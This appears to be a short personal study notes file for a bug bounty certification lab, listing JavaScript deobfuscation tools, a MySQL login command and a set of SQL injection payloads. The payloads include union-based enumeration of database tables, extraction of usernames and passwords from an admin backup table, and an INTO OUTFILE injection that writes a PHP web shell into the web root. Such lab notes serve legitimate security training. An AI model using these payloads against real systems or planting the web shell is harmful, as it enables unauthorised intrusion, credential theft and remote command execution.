# CBBH
Stuff for CBBH


  JavaScript Deobsfucation - Tools
    
    https://beautifier.io/
    http://www.jsnice.org/


  Intro to MySQL

    Connect to database
    sudo service mysql start
    
    mysql -h 94.237.62.195 -P 39097 -u root --password
    -h : for host/target
    -P : for custom port
    -u : for user
    --password : for password
  
    Find stuff with queries
    
    select * from employees where first_name LIKE 'Bar%' AND hire_date='1990-01-01';
    LIKE : You may use when searching for a substring in string (i.e Bar = Barton).
    % : Starts with (used in mysql)

    ')+or+id=4--+-

    Database enumeration

    #Get it without line breaking
    '+union+select+1,group_concat(table_name),3,4+from+information_schema.tables--+-

    #Get it nicier
    '+union+select+1,table_schema,table_name,4,5+from+information_schema.tables--+-
    
    #Writing files
    '+union+select+null,null,null,"<?php+system($_REQUEST['cmd']);?>"+into+outfile+"/var/www/html/blah2.php"--+-

    #Get data from whithin another database
    '+union+select+1,username,password,4,5+from+backup.admin_bk--+-
